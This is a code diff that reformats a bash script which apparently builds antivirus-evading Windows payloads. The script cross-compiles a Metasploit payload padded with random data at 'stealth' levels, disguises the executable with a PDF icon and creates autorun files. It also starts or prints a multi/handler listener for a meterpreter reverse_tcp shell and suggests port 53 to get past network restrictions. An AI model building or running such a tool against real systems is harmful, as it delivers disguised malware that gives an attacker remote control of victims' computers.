@@ -35,30 +35,30 @@ VERSION="1.5"
 # spinner for Metasploit Generator
 spinlong ()
 {
-bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
-barlength=${#bar}
-i=0
-while ((i < 100)); do
-  n=$((i*barlength / 100))
-  printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
-  ((i += RANDOM%5+2))
-  sleep 0.02
-done
+    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+    barlength=${#bar}
+    i=0
+    while ((i < 100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.02
+    done
 }
 
 
 # spinner for random seed generator
 spinlong2 ()
 {
-bar=" 011001110010010011101110011010101010101101010010101110"
-barlength=${#bar}
-i=0
-while ((i < 100)); do
-  n=$((i*barlength / 100))
-  printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
-  ((i += RANDOM%5+2))
-  sleep 0.02
-done
+    bar=" 011001110010010011101110011010101010101101010010101110"
+    barlength=${#bar}
+    i=0
+    while ((i < 100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.02
+    done
 }
 
 clear
@@ -74,26 +74,24 @@ clear
 
 #Check for gcc compiler
 which i586-mingw32msvc-gcc >/dev/null 2>&1
-if [ $? -eq 0 ]
-	then
-		echo ""
+if [ $? -eq 0 ]; then
+    echo ""
 else
-		echo ""
-		echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc and try again"
-		echo ""
-		exit 1
+    echo ""
+    echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc and try again"
+    echo ""
+    exit 1
 fi
 
 #Check for Metasploit
-if [[ "$MSFPAYLOAD" != "" || "$MSFENCODE" != "" || "$MSFCLI" != "" ]]
-	then
-		echo ""
+if [[ "$MSFPAYLOAD" != "" || "$MSFENCODE" != "" || "$MSFCLI" != "" ]]; then
+    echo ""
 else
-		echo ""
-		echo -e "\e[01;31m[!]\e[00m Unable to find the required Metasploit program, cant continue. Install and try again"
-		echo -e "\e[01;31m[!]\e[00m If msfpayload, msfencode and msfcli are not in your PATH, edit this script options"
-		echo ""
-		exit 1
+    echo ""
+    echo -e "\e[01;31m[!]\e[00m Unable to find the required Metasploit program, cant continue. Install and try again"
+    echo -e "\e[01;31m[!]\e[00m If msfpayload, msfencode and msfcli are not in your PATH, edit this script options"
+    echo ""
+    exit 1
 fi
 
 
@@ -102,33 +100,31 @@ fi
 #Check for PDF icon files
 
 ls icons/icon.res >/dev/null 2>&1 && ls icons/autorun.ico >/dev/null 2>&1
-if [ $? -eq 0 ]
-	then
-		echo ""
-	else
-		echo ""
-		echo -e "\e[01;31m[!]\e[00m I can't find the icon files I will need, I will try and download these now"
-		echo ""
-		sleep 2
-		echo ""
-		echo -e "\e[01;32m[-]\e[00m Attempting to download 2 files...please wait"
-		echo ""
-		mkdir icons >/dev/null 2>&1
-		cd icons >/dev/null 2>&1
-		wget http://www.commonexploits.com/tools/avoid/icon.res >/dev/null 2>&1
-		wget http://www.commonexploits.com/tools/avoid/autorun.ico >/dev/null 2>&1
-		sleep 2
-		ls icon.res >/dev/null 2>&1 && ls autorun.ico >/dev/null 2>&1
-		if [ $? -eq 0 ]
-			then
-			echo -e "\e[01;32m[+]\e[00m Success, icon files downloaded"
-			cd ..
-			echo ""
-		else
-			echo -e "\e[01;31m[!]\e[00m Unable to download the icon files, script will continue but you will not have the masked PDF exe or autorun icon"
-			cd ..
-			echo ""
-		fi
+if [ $? -eq 0 ]; then
+    echo ""
+else
+    echo ""
+    echo -e "\e[01;31m[!]\e[00m I can't find the icon files I will need, I will try and download these now"
+    echo ""
+    sleep 2
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Attempting to download 2 files...please wait"
+    echo ""
+    mkdir icons >/dev/null 2>&1
+    cd icons >/dev/null 2>&1
+    wget http://www.commonexploits.com/tools/avoid/icon.res >/dev/null 2>&1
+    wget http://www.commonexploits.com/tools/avoid/autorun.ico >/dev/null 2>&1
+    sleep 2
+    ls icon.res >/dev/null 2>&1 && ls autorun.ico >/dev/null 2>&1
+    if [ $? -eq 0 ]; then
+        echo -e "\e[01;32m[+]\e[00m Success, icon files downloaded"
+        cd ..
+        echo ""
+    else
+        echo -e "\e[01;31m[!]\e[00m Unable to download the icon files, script will continue but you will not have the masked PDF exe or autorun icon"
+        cd ..
+        echo ""
+    fi
 fi
 
 # Random Msfencode encoding iterations
@@ -148,44 +144,42 @@ echo ""
 echo -ne "\e[01;32m>\e[00m "
 read INTEXT
 echo ""
-	if [ "$INTEXT" = "1" ]
-		then
-			echo ""
-			IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
-			IP=$(ifconfig "$IPINT" |grep "inet adr:" |cut -d ":" -f 2 |awk '{ print $1 }')
-			echo -e "\e[01;32m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m using interface \e[01;32m$IPINT\e[00m"
-			echo ""
-			echo -e "\e[1;31m-------------------------------------------------------\e[00m"
-			echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?"
-			echo -e "\e[1;31m-------------------------------------------------------\e[00m"
-			echo ""
-			echo -ne "\e[01;32m>\e[00m "
-			read PORT
-			echo ""
-	elif [ "$INTEXT" = "2" ]
-		then
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Alternative system selected"
-			echo ""
-			echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
-			echo -e "\e[01;31m[?]\e[00m What IP address to you want the listener to run on?"
-			echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
-			echo ""
-			echo -ne "\e[01;32m>\e[00m "
-			read IP
-			echo ""
-			echo ""
-			echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
-			echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on? If on the internet try port 53 if restricted"
-			echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
-			echo ""
-			echo -ne "\e[01;32m>\e[00m "
-			read PORT
-			echo ""
-	else
-		echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again"
-		echo ""
-		exit 1
+if [ "$INTEXT" = "1" ]; then
+    echo ""
+    IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
+    IP=$(ifconfig "$IPINT" |grep "inet adr:" |cut -d ":" -f 2 |awk '{ print $1 }')
+    echo -e "\e[01;32m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m using interface \e[01;32m$IPINT\e[00m"
+    echo ""
+    echo -e "\e[1;31m-------------------------------------------------------\e[00m"
+    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on?"
+    echo -e "\e[1;31m-------------------------------------------------------\e[00m"
+    echo ""
+    echo -ne "\e[01;32m>\e[00m "
+    read PORT
+    echo ""
+elif [ "$INTEXT" = "2" ]; then
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Alternative system selected"
+    echo ""
+    echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
+    echo -e "\e[01;31m[?]\e[00m What IP address to you want the listener to run on?"
+    echo -e "\e[1;31m--------------------------------------------------------------------\e[00m"
+    echo ""
+    echo -ne "\e[01;32m>\e[00m "
+    read IP
+    echo ""
+    echo ""
+    echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
+    echo -e "\e[01;31m[?]\e[00m What port number do you want to listen on? If on the internet try port 53 if restricted"
+    echo -e "\e[1;31m---------------------------------------------------------------------------------------------------------\e[00m"
+    echo ""
+    echo -ne "\e[01;32m>\e[00m "
+    read PORT
+    echo ""
+else
+    echo -e "\e[01;31m[!]\e[00m You didnt select a valid option, try again"
+    echo ""
+    exit 1
 fi
 echo ""
 echo -e "\e[01;32m[-]\e[00m Generating Metasploit payload, please wait..."
@@ -215,55 +209,50 @@ echo ""
 echo -ne "\e[01;32m>\e[00m "
 read LEVEL
 echo ""
-	if [ "$LEVEL" = "1" ]
-		then
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Normal selected, please wait a few seconds"
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
-			echo ""
-			spinlong2
-			SEED=$(shuf -i 100000-500000 -n 1)
-	elif [ "$LEVEL" = "2" ]
-		then
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Stealth selected, please wait a few seconds"
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
-			echo ""
-			spinlong2
-			SEED=$(shuf -i 1000000-5000000 -n 1)
-	elif [ "$LEVEL" = "3" ]
-		then
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Super Stealth selected, please wait a few seconds"
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
-			echo ""
-			spinlong2
-			SEED=$(shuf -i 8000000-12000000 -n 1)
-	elif [ "$LEVEL" = "4" ]
-		then
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Insane Stealth selected, please wait a few minutes"
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
-			echo ""
-			spinlong2
-			SEED=$(shuf -i 40000000-60000000 -n 1)
-	elif [ "$LEVEL" = "5" ]
-		then
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes"
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
-			echo ""
-			spinlong2
-			SEED=$(shuf -i 100000000-200000000 -n 1)
-	else
-			echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting"
-			echo ""
-			exit 1
+if [ "$LEVEL" = "1" ]; then
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Normal selected, please wait a few seconds"
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
+    echo ""
+    spinlong2
+    SEED=$(shuf -i 100000-500000 -n 1)
+elif [ "$LEVEL" = "2" ]; then
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Stealth selected, please wait a few seconds"
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
+    echo ""
+    spinlong2
+    SEED=$(shuf -i 1000000-5000000 -n 1)
+elif [ "$LEVEL" = "3" ]; then
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Super Stealth selected, please wait a few seconds"
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
+    echo ""
+    spinlong2
+    SEED=$(shuf -i 8000000-12000000 -n 1)
+elif [ "$LEVEL" = "4" ]; then
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Insane Stealth selected, please wait a few minutes"
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
+    echo ""
+    spinlong2
+    SEED=$(shuf -i 40000000-60000000 -n 1)
+elif [ "$LEVEL" = "5" ]; then
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Desperate Stealth selected, please wait a few minutes"
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Generating random seed for padding...please wait"
+    echo ""
+    spinlong2
+    SEED=$(shuf -i 100000000-200000000 -n 1)
+else
+    echo -e "\e[01;31m[!]\e[00m You didnt select a option, exiting"
+    echo ""
+    exit 1
 fi
 
 # build the c file ready for compile
@@ -286,25 +275,23 @@ echo '}' >> build.c
 # gcc compile the exploit
 
 ls icons/icon.res >/dev/null 2>&1
-	if [ $? -eq 0 ]
-		then
-			i586-mingw32msvc-gcc -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME"
-		else
-			i586-mingw32msvc-gcc -Wall -mwindows build.c -o "$OUTPUTNAME"
+if [ $? -eq 0 ]; then
+    i586-mingw32msvc-gcc -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME"
+else
+    i586-mingw32msvc-gcc -Wall -mwindows build.c -o "$OUTPUTNAME"
 fi
 
 # check if file built correctly
 LOCATED=`pwd`
 ls "$OUTPUTNAME" >/dev/null 2>&1
-	if [ $? -eq 0 ]
-		then
-			echo ""
-			echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
-	else
-			echo ""
-			echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
-			echo ""
-			exit 1
+if [ $? -eq 0 ]; then
+    echo ""
+    echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
+else
+    echo ""
+    echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
+    echo ""
+    exit 1
 fi
 
 # create autorun files
@@ -339,19 +326,18 @@ echo ""
 echo -ne "\e[01;32m>\e[00m "
 read INTEXT
 echo ""
-	if [ "$INTEXT" = "1" ]
-		then
-			echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
-			echo ""
-			$MSFCLI exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E 2>/dev/null
-		else
-			echo ""
-			echo -e "\e[01;32m[-]\e[00m Run the following code on your listener system:"
-			echo ""
-			echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
-			echo ""
-			echo "$MSFCLI exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E"
-			echo ""
-			echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
-			echo ""
+if [ "$INTEXT" = "1" ]; then
+    echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
+    echo ""
+    $MSFCLI exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E 2>/dev/null
+else
+    echo ""
+    echo -e "\e[01;32m[-]\e[00m Run the following code on your listener system:"
+    echo ""
+    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
+    echo ""
+    echo "$MSFCLI exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST="$IP" LPORT="$PORT" E"
+    echo ""
+    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
+    echo ""
 fi
